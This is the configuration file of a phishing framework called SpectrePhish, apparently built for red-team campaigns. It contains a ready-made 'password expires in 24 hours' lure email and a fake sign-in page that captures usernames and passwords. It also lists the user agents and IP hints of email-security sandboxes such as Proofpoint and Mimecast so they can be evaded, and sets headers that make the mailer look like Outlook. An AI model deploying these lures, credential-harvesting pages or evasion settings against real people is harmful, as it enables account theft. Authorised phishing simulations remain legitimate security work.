"""
SpectrePhish :: config.py
Constants, palette, banner, OPSEC defaults, built-in template + landing.

Author : Inayat Hussain  (Red Team Operator & Offensive Security Engineer)
"""

from __future__ import annotations

import os
import re
import sys

TOOL_NAME = "SpectrePhish"
VERSION = "1.1.0"
SUBTITLE = "Phishing Operator"
AUTHOR = "Inayat Hussain"
AUTHOR_ROLE = "Red Team Operator & Offensive Security Engineer"

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "data")
TEMPLATE_DIR = os.path.join(DATA_DIR, "templates")
LANDING_DIR = os.path.join(DATA_DIR, "landings")
PAYLOAD_DIR = os.path.join(DATA_DIR, "payloads")
EXPORT_DIR = os.path.join(BASE_DIR, "exports")
STORE_PATH = os.path.join(DATA_DIR, "spectrephish.db")

DEFAULT_PORT = 8080
DEFAULT_LISTEN = "0.0.0.0"
DEFAULT_DELAY = 1.0
DEFAULT_BATCH = 25
DEFAULT_TIMEOUT = 15

TRACK_PIXEL = "p"
TRACK_CLICK = "c"
TRACK_SUBMIT = "s"
TRACK_REPORT = "r"
TRACK_PAYLOAD = "payload"

USER_AGENT = "SpectrePhish/1.1"

SANDBOX_UA_HINTS = (
    "proofpoint", "mimecast", "barracuda", "ironport", "forcepoint",
    "headlesschrome", "phantomjs", "python-requests", "curl/", "wget/",
    "safelinks",
)
SANDBOX_IP_HINTS = ("proofpoint", "mimecast", "amazonses", "outlook")

OPTSEC_DEFAULT_HEADERS = {
    "X-Mailer": "Microsoft Outlook 16.0",
    "Precedence": "bulk",
}

MAIL_HEADERS_KEEP = ("from", "to", "cc", "bcc", "subject", "date", "message-id")

_NO_COLOR = bool(os.environ.get("NO_COLOR")) or not sys.stdout.isatty()


class C:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    GREY = "\033[90m"
    ACCENT = "\033[38;5;141m"
    ACCENT2 = "\033[38;5;99m"
    DIMC = "\033[38;5;240m"


def paint(text, *styles) -> str:
    if _NO_COLOR:
        return str(text)
    return "".join(styles) + str(text) + C.RESET


ANSI_RE = re.compile(r"\033\[[0-9;]*m")


def strip_ansi(text: str) -> str:
    return ANSI_RE.sub("", text)


def log(prefix: str, message: str = "") -> None:
    styles = {
        "[*]": (C.DIMC,), "[+]": (C.GREEN,), "[!]": (C.YELLOW,),
        "[!!]": (C.RED, C.BOLD), "[X]": (C.DIMC,), "[OPSEC]": (C.ACCENT2,),
    }.get(prefix, (C.WHITE,))
    print(f"{paint(prefix, *styles)} {message}", flush=True)


BANNER = r"""
  ____  ____  _____ ____ _____ ____  _____ ____  _   _ ___ ____  _   _
 / ___||  _ \| ____/ ___|_   _|  _ \| ____|  _ \| | | |_ _/ ___|| | | |
 \___ \| |_) |  _|| |     | | | |_) |  _| | |_) | |_| || |\___ \| |_| |
  ___) |  __/| |__| |___  | | |  _ <| |___|  __/|  _  || | ___) |  _  |
 |____/|_|   |_____\____| |_| |_| \_\_____|_|   |_| |_|___|____/|_| |_|
"""

BANNER_META = [
    "Phishing Operator Framework",
    "campaigns · tracking · OPSEC",
    "",
    "By Inayat Hussain",
    "( Red Team Operator & Offensive Security Engineer )",
    "v" + VERSION,
]

DEFAULT_TEMPLATE_SUBJECT = "Action required: Password expires in 24 hours"

DEFAULT_TEMPLATE_TEXT = """Hi {{.FirstName}},

Your {{.Domain}} password expires in 24 hours.

Re-authenticate here: {{.URL}}

Regards,
IT Service Desk
"""

DEFAULT_TEMPLATE_HTML = """<!DOCTYPE html>
<html><body style="margin:0;padding:0;background:#f4f5f7;font-family:Segoe UI,Arial,sans-serif">
<table width="100%" cellpadding="0" cellspacing="0"><tr><td align="center" style="padding:32px 0">
<table width="560" cellpadding="0" cellspacing="0" style="background:#fff;border-radius:8px;overflow:hidden">
  <tr><td style="background:#0f172a;padding:20px 28px;color:#fff;font-size:18px;font-weight:600">
    IT Service Desk
  </td></tr>
  <tr><td style="padding:28px;color:#1f2937;font-size:15px;line-height:1.6">
    <p>Hi {{.FirstName}},</p>
    <p>Your <strong>{{.Domain}}</strong> account password expires in <strong>24 hours</strong>.
       Please re-authenticate to avoid losing access.</p>
    <p style="margin:28px 0">
      <a href="{{.URL}}" style="background:#2563eb;color:#fff;text-decoration:none;padding:12px 24px;border-radius:6px;display:inline-block">
        Keep my access
      </a>
    </p>
    <p style="color:#6b7280;font-size:13px">
      If the button fails, paste this into your browser:<br>{{.URL}}</p>
  </td></tr>
  <tr><td style="padding:16px 28px;background:#f9fafb;color:#9ca3af;font-size:12px">
    Automated message from {{.Domain}} IT Services
  </td></tr>
</table>
</td></tr></table>
</body></html>
"""

DEFAULT_LANDING_HTML = """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Sign in</title>
<style>
*{box-sizing:border-box}
body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;
background:#f2f2f2;font-family:Segoe UI,Arial,sans-serif}
.card{background:#fff;padding:44px 40px;width:380px;box-shadow:0 2px 12px rgba(0,0,0,.12)}
h1{font-size:22px;margin:0 0 20px;font-weight:600}
input{width:100%;padding:11px 12px;margin-bottom:14px;border:1px solid #ccc;font-size:14px}
button{width:100%;padding:11px;background:#0067b8;color:#fff;border:0;font-size:15px;cursor:pointer}
.err{color:#a80000;font-size:13px;margin-bottom:12px;display:none}
</style></head><body>
<form class="card" method="POST">
  <h1>Sign in</h1>
  <div class="err" id="e">Incorrect password. Try again.</div>
  <input name="username" placeholder="Email or username" required>
  <input name="password" type="password" placeholder="Password" required>
  <button type="submit">Sign in</button>
</form>
<script>
document.querySelector('form').addEventListener('submit',function(){
  var u=document.createElement('input');u.type='hidden';u.name='tz';
  u.value=Intl.DateTimeFormat().resolvedOptions().timeZone;this.appendChild(u);
});
</script>
</body></html>
"""
